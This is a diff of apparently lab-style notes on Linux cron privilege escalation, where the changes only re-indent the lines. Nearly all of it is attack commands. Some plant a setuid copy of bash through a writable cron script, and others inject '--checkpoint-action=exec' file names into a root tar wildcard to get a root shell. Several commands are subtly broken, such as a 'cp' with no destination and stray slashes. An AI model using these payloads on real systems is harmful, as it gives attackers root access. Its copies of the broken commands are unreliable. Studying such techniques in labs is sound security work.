@@ -48,10 +48,10 @@ cat /etc/cron.deny*
           
    ## overwrite.sh Exploit
       
-     touch /home/user/overwrite.sh
-     echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
-     chmod +x /home/user/overwrite.sh
-     /tmp/bash -p
+    touch /home/user/overwrite.sh
+    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+    chmod +x /home/user/overwrite.sh
+    /tmp/bash -p
 
 
 
@@ -62,17 +62,17 @@ cat /etc/cron.deny*
       
    ## OUTPUT
    
-          #!/bin/sh
-          cd /home/user
-          tar czf /tmp/backup.tar.gz *
+     #!/bin/sh
+     cd /home/user
+     tar czf /tmp/backup.tar.gz *
           
    ## Exploit wildcards
    
-        echo 'cp /bin/bash/ /tmp/bash; chmod +s /tmp/bash' > asif.sh
-        chmod 777 asif.sh
-        touch /home/user/--checkpoint=1
-        touch /home/user/--checkpoint-action=exec=sh\asif.sh
-        /tmp//bash -p
+    echo 'cp /bin/bash/ /tmp/bash; chmod +s /tmp/bash' > asif.sh
+    chmod 777 asif.sh
+    touch /home/user/--checkpoint=1
+    touch /home/user/--checkpoint-action=exec=sh\asif.sh
+    /tmp//bash -p
         
         
         
@@ -80,9 +80,9 @@ cat /etc/cron.deny*
         
    ## Change File permissions And Exploit
    
-       locate overwrite.sh
-       echo 'cp /bin/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
-       /tmp/bash -p
+    locate overwrite.sh
+    echo 'cp /bin/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
+    /tmp/bash -p
    
    
    
